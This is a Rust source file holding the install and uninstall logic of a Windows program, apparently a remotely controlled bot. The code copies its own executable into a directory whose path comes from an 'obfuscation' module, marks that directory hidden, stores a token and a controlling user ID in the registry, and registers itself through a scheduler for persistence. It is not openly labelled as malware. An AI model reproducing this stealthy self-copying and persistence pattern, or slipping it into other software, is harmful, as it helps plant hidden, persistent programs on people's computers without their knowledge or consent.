use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;

use anyhow::{Context, Result};

use crate::security::obfuscation;

/// Remove leftover .old files from previous self-updates.
pub fn cleanup_old_files() {
    let home = obfuscation::install_home();
    if let Ok(entries) = std::fs::read_dir(home) {
        for entry in entries.flatten() {
            if entry.path().extension().is_some_and(|e| e == "old") {
                let _ = std::fs::remove_file(entry.path());
            }
        }
    }
}

/// Ensure home dir exists, mark as hidden, copy exe if not already there.
/// Returns `(home_dir, target_exe_path)`.
fn setup_home_dir() -> Result<(PathBuf, PathBuf)> {
    let home = obfuscation::install_home();
    std::fs::create_dir_all(home)
        .with_context(|| format!("cannot create home dir: {}", home.display()))?;

    // Mark directory as hidden.
    let attrs = unsafe {
        windows_sys::Win32::Storage::FileSystem::GetFileAttributesW(
            home.as_os_str().encode_wide().collect::<Vec<_>>().as_ptr(),
        )
    };
    if attrs != u32::MAX {
        unsafe {
            windows_sys::Win32::Storage::FileSystem::SetFileAttributesW(
                home.as_os_str().encode_wide().collect::<Vec<_>>().as_ptr(),
                attrs | windows_sys::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN,
            );
        }
    }

    let current_exe = std::env::current_exe().context("cannot get current exe path")?;
    let canonical_current = current_exe
        .canonicalize()
        .unwrap_or_else(|_| current_exe.clone());
    let target_exe = home.join(current_exe.file_name().context("cannot get exe filename")?);
    let canonical_target = target_exe
        .canonicalize()
        .unwrap_or_else(|_| target_exe.clone());

    if canonical_current != canonical_target {
        std::fs::copy(&current_exe, &target_exe).with_context(|| {
            format!(
                "cannot copy exe from {} to {}",
                current_exe.display(),
                target_exe.display()
            )
        })?;
        log::info!("Copied exe to {}", target_exe.display());
    } else {
        log::info!("Already running from home dir, skipping copy");
    }

    Ok((home.to_path_buf(), target_exe))
}

pub fn install(token: &str, super_user_id: i64) -> Result<()> {
    super::config::save_to_registry(token, super_user_id)?;
    let (_, exe_path) = setup_home_dir()?;
    super::scheduler::install(&exe_path)?;
    log::info!("Installed successfully");
    Ok(())
}

pub fn uninstall() -> Result<()> {
    let _ = super::scheduler::uninstall();

    let home = obfuscation::install_home();
    if home.exists() {
        std::fs::remove_dir_all(home)
            .with_context(|| format!("cannot remove home dir: {}", home.display()))?;
        log::info!("Removed home dir: {}", home.display());
    }

    log::info!("Uninstalled successfully");
    Ok(())
}
